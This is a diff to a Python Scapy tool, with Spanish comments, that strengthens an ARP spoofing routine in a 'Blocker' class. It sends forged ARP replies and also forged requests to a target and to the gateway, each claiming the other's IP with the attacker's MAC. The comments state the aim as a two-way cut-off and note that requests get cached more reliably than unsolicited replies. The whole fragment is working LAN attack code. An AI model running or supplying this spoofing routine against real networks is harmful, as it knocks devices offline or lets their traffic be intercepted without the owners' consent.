@@ -159,16 +159,19 @@ class Blocker:
         sendp(Ether(dst=dst_mac) / pkt, iface=self.info.iface, verbose=False)
 
     def _poison_once(self, ip: str, mac: str):
+        gw = self.info.gateway_ip
+        me = self.info.own_mac
         for _ in range(POISON_BURST):
-            # Al objetivo: "el router soy yo"
-            self._send(mac, ARP(op=2, pdst=ip, hwdst=mac,
-                                psrc=self.info.gateway_ip, hwsrc=self.info.own_mac))
+            # Al objetivo: "el router (gw) soy yo". Enviamos RESPUESTA (op=2) y
+            # también PETICIÓN (op=1): muchos dispositivos solo guardan en caché
+            # el remitente de una petición ARP, no una respuesta no solicitada.
+            self._send(mac, ARP(op=2, pdst=ip, hwdst=mac, psrc=gw, hwsrc=me))
+            self._send(mac, ARP(op=1, pdst=ip, hwdst=mac, psrc=gw, hwsrc=me))
             # Al router: "ese equipo soy yo" (corte bidireccional)
             if self.info.gateway_mac:
-                self._send(self.info.gateway_mac,
-                           ARP(op=2, pdst=self.info.gateway_ip,
-                               hwdst=self.info.gateway_mac,
-                               psrc=ip, hwsrc=self.info.own_mac))
+                gm = self.info.gateway_mac
+                self._send(gm, ARP(op=2, pdst=gw, hwdst=gm, psrc=ip, hwsrc=me))
+                self._send(gm, ARP(op=1, pdst=gw, hwdst=gm, psrc=ip, hwsrc=me))
 
     def _restore(self, ip: str, mac: str):
         if not self.info.gateway_mac:
